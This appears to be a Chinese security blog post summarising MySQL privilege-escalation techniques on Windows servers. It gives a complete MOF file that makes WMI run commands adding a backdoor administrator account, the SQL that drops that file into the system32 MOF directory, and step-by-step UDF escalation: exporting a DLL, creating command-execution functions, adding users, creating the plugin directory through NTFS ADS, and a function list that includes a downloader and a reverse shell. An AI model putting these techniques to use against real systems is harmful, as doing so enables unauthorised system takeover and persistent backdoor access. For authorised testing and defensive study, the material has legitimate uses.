---
title: Mysql提权小结
date: 2018-10-08T21:21:00+08:00
tags: 红蓝对抗
draft: false
---

<!--nextpage-->
![](http://xtpeeps.cn/wp-content/uploads/2018/03/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20180302133144.png)

> 学习Mysql提权小结一下，基本过程。明确了基本思路和方式方法。

<!--more-->

### 1. mof提权

#### 原理：
利用了c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次的特性，来写入我们的cmd命令使其被带入执行。
#### 条件：
mysql注入可执行，存在可读写目录，可上传，。
#### 影响范围：
操作系统 win2003可（因为需要访问到system32中目录）
数据库为mysql且知道mysql登录账号密码和允许外连

#### 方式方法：
1. 构造mof
    ```
    #pragma namespace("\\\\.\\root\\subscription")
    
    instance of __EventFilter as $EventFilter
    {
        EventNamespace = "Root\\Cimv2";
        Name  = "filtP2";
        Query = "Select * From __InstanceModificationEvent "
                "Where TargetInstance Isa \"Win32_LocalTime\" "
                "And TargetInstance.Second = 5";
        QueryLanguage = "WQL";
    };
    
    instance of ActiveScriptEventConsumer as $Consumer
    {
        Name = "consPCSV2";
        ScriptingEngine = "JScript";
        ScriptText =
        "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user xtpeeps xtpeeps.cn /add & net.exe localgroup administrators xtpeeps /add\")";
    };
    
    instance of __FilterToConsumerBinding
    {
        Consumer   = $Consumer;
        Filter = $EventFilter;
    };
    ```

    执行了这两句：
    ```
    net.exe user xtpeeps xtpeeps.cn /add
    ```
    ```
    net.exe localgroup administrators xtpeeps /add
    ```

2. 上传构造的mof文件到可读写的目录下。
    ```
    select load_file("C:/php/APMServ5.2.6/www/htdocs/1.mof") into dumpfile "c:/windows/system32/wbem/mof/nullevt.mof"
    ```



#### 相关问题：
mof是WMI存储库的托管对象格式。

#### 参考：
[mof提权原理及实现](https://www.cnblogs.com/wh4am1/p/6613770.html)

[MYSQL提权总结 | waitalone.cn](https://www.waitalone.cn/mysql-tiquan-summary.html)

### 2. UDF提权

#### 原理：
UDF（用户定义函数）是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权限mysql账号时比较好用的一种提权方法。
####条件：
1. 目标主机系统是Windows（Win2000、XP、Win2003）。
2. 拥有该主机mysql中的某个用户账号，该账号需要有对mysql的insert和delete权限。

#### 影响范围：
mysql<=5.1

#### 方式方法：

1. 获取当前mysql的一个账号，一般情况下在网站的config.php文件就能找到（具体在哪个文件每个CMS都不一样）。

2. 把udf专用的webshell传到服务器上（提示 “上传失败、原因:Result consisted of more than one row”、实际上大多数已上传成功），再连接mysql执行命令。

3. 连接成功后，导出DLL文件。  
    mysql<5.0，导出路径随意；\
    5.0<=mysql<5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“No paths allowed for shared library”错误；mysql>5.1，需要使用
    ```
    show variables like '%plugin%';
    ```
    mysql版本 < 5.2 , UDF导出到系统目录c:/windows/system32/  
    mysql版本 > 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\
    语句查看插件安装路径，导出的时候指定DLL路径为插件路径。

4. 使用SQL语句创建自定义函数。语法如下：

    ```
    Create Function 函数名 returns string soname ‘导出的DLL路径’;
    e.g.
    Create Function cmdshell returns string soname 'udf.dll';
    -----------或者
    Create function MyCmd returns string soname "udf.dll";
    Select MyCmd("CMD命令");
    Drop function MyCmd;
    ```
    ```
    cmdshell    执行cmd;
    downloader  下载者,到网上下载指定文件并保存到指定目录;
    open3389    通用开3389终端服务,可指定端口(不改端口无需重启);
    backshell   反弹Shell;
    ProcessView 枚举系统进程;
    KillProcess 终止指定进程;
    regread     读注册表;
    regwrite    写注册表;
    shut        关机,注销,重启;
    about       说明与帮助函数;
    ```
	若mysql>=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。
	如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：

    ```
    delete from mysql.func where name='cmdshell'
    ```
5. 创建函数成功后，就可以通过sql语句去调用它了。语法如下：

    select 创建的函数名 (‘参数列表’);
    // e.g. select cmdshell(“net user ghy459 hack0nair /add”); 创建一个用户ghy459，密码为hack0nair

6. 函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。删除函数的语法如下：

    drop function 创建的函数名;
    // e.g. drop function cmdshell;


#### 相关问题：
1. 导出的文件名不一定非是xxx.dll，可以是任意的。
    ```
    create function sys_eval returns string soname 'udf.xox';
    ```

2. 提示错误 Can’t open shared library ‘fun.dll’ (errno: 2 )\
    除了udf不存在、udf被杀，还有可能是你的udf版本不对，你拿32位的udf去在64位系统注册的话，一样会提示错误。

3. 降权的mysql一样有用，能注册dll的话你一样能够执行命令，不过权限是根据mysql来的， 在不支持aspx，ws、shell.application被删得情况下还有一丝希望。

4. 某些情况下，我们会遇到Can't open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，但是默认情况下plugin不存在，怎么办？ 还好有大牛研究出了利用NTFS ADS流来创建文件夹的方法
    ```
    select @@basedir;   //查找mysql的目录
    select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';    //使用NTFS ADS流创建lib目录
    select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION'; //利用NTFS ADS再次创建plugin目录
    执行成功以后再进行导出即可。
    ```
5. 直接执行
    ```
    create function sys_eval returns string soname 'udf.dll'
    ```

    若成功则可直接执行命令。
    mysql版本小于5.1此方法一般不成功，则需要导入dll到系统目录，一般导入到c:\windows\system32\，如果不可写入则试试c:\windows\（一般5.0一下放这）。

    ```
    create table a (cmd LONGBLOB);
    insert into a (cmd) values (hex(load_file('D:\\Program Files\\MySQL\\MySQL Server 5.0\\Lib\\Plugin\\lib_mysqludf_sys.dll')));
    SELECT unhex(cmd) FROM a INTO DUMPFILE 'c:\\windows\\system32\\udf.dll';
    create function sys_eval returns string soname 'udf.dll'
    select sys_eval('ipconfig');
    ```

#### 参考：
http://blog.csdn.net/wulex/article/details/54868131
